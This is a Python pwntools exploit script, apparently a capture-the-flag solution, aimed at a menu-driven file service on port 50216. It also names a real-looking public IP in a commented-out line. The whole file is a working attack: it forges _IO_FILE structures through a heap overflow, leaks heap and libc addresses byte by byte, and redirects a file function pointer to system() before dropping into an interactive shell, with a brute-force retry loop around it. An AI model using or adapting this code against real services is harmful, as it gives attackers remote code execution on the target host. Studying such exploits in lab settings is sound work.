from pwn import *
# this is exploit code that run 16.04
for i in range(0,0xffff):
  try:
    #s=remote('52.198.183.186', 50216)
    s = remote('192.168.32.95',50216)
    def alloc(name):
      s.recvuntil('choice:') 
      s.sendline('1')
      s.recvuntil(':')
      s.sendline(name)
    def read_a(index, size, dat):
      s.recvuntil('choice:')
      s.sendline('2')
      s.recvuntil(':')
      s.sendline(str(index))
      s.recvuntil(':')
      s.sendline(str(size))
      s.sendline(dat)
    def read_l(index, size):
      s.recvuntil('choice:')
      s.sendline('2')
      s.recvuntil(':')
      s.sendline(str(index))
      s.recvuntil(':')
      s.sendline(str(size))

    def write(index):
      s.recvuntil('choice:')
      s.sendline('3')
      s.recvuntil(':')
      s.sendline(str(index))
    def close_l(index):
      s.recvuntil('choice:')
      s.sendline('4')
      s.recvuntil(':')
      s.sendline(str(index))
    alloc('/dev/fd/0')
    alloc('/etc/passwd')
    dat = "A"*0x18
    dat += p64(0x231)
    dat += p64(0x00000000fbad2488)
    read_a(0,len(dat)+1,dat+'\x98')
    read_l(1,1)
    print [s.recv()]
    write(1)
    #print hexdump(s.recvuntil('Your choice: '))
    heap = ""
    heap += (s.recvuntil('Your choice: ')[0x1f:0x20])
    s.sendline('9')
    for i in range(1,6):
      s.sendline('9')
      close_l(1)
      alloc('/etc/passwd')
      read_a(0,len(dat)+1, dat[1:] + p8(0x98+i))
      read_l(1,1)
      write(1)
      heap += (s.recvuntil('Your choice: ')[0x1f:0x20])
    heap = u64(heap+"\x00\x00") - 0xf0
    log.info('HEAP : 0x%x'%heap)
    s.sendline('9')
    close_l(1)
    dat = "A"*0x17
    dat += p64(0x231)
    dat += p64(0x00000000fbad2488)
    alloc('/etc/passwd')
    read_a(0,len(dat)+7,dat+p64(heap+0x78)[:-1])
    read_l(1,1)
    write(1)
    libc = ""
    libc += (s.recvuntil('Your choice: ')[0x1f:0x20]) 
    s.sendline('9')
    close_l(1)
    for i in range(1,6):
      print hexdump(libc)
      alloc('/etc/passwd')
      read_a(0,len(dat)+7,dat[1:]+p64(heap+0x78+i)[:-1])
      read_l(1,1)
      write(1)
      libc += (s.recvuntil('Your choice: ')[0x1f:0x20])
      s.sendline('9')
      close_l(1)
    libc = u64(libc+'\x00\x00') - 0x3c2520#0x3c5540
    log.info('LIBC : 0x%x'%libc)
    log.info("SYSTEM : 0x%x"%(libc+0x456a0))
    alloc('/dev/stdin')
    alloc("AAAA")
    alloc('/etc/passwd')
    read_l(2,1)
    magic = heap+0x230
    
    dat = "B"*(14+8)
    dat += p64(0x231)
    dat += p64(0x00000000fbad2488)
    dat += p64(heap+0x230)*5 + p64(heap+0x230+0x5) + p64(heap+0x230)
    dat += p64(heap+0x230+0x5)
    read_a(0,len(dat),dat)
    read_a(1,3,'A'*3)
    read_a(1,4,'A'*4)
    read_a(1,5,p64(libc+0x456a0)[:5])

    dat = "C"*(14+8 -1)
    dat += p64(0x231)
    dat += p64(0x00000000fbad2488)
    dat += p64(heap+0x1fe8)*5 + p64(heap+0x1fe8+5) + p64(heap+0x1fe8)
    dat += p64(heap+0x1fe8+0x5)
    read_a(0,len(dat)+1,dat)
    read_a(1,0x4,"A"*0x4)
    read_a(1,0x5,p64(libc+0x0003BDBD0-0x40+0x8)[:5])
    
    dat = "B"*(0x20 - 3 - 0x8)
    dat += p64(0x231)
    dat += p64(0x00000000fb006873)
    dat += p64(heap+0x1fb0)*5 + p64(heap+0x1fb0+6) + p64(heap+0x1fb0)
    dat += p64(heap+0x1fb0+6)
    read_a(0,len(dat)+1,dat)
    read_a(1,0x5,'A'*0x5)
    read_a(1,0x6,p64(magic-0xe8))
    
    '''
    dat = "B"*(0x20 - 3 - 0x8)
    dat += p64(0x231)
    dat += p64(0x00000000fb006873)
    dat += p64(heap+0x178)*5 + p64(heap+0x178+5) + p64(heap+0x178)
    dat += p64(heap+0x178+5)
    read_a(0,len(dat)+1,dat)
    read_a(1,4,"AAAA")
    read_a(1,4,"A"*4)
    read_a(1,5,p64(libc+0x0003BDBD0-0x40)[:5])
    read_a(1,5,p64(libc+0x0003BDBD0-0x40)[:5])
    '''
    s.interactive()
  except Exception as e:
    print e.message
    s.close()
    continue
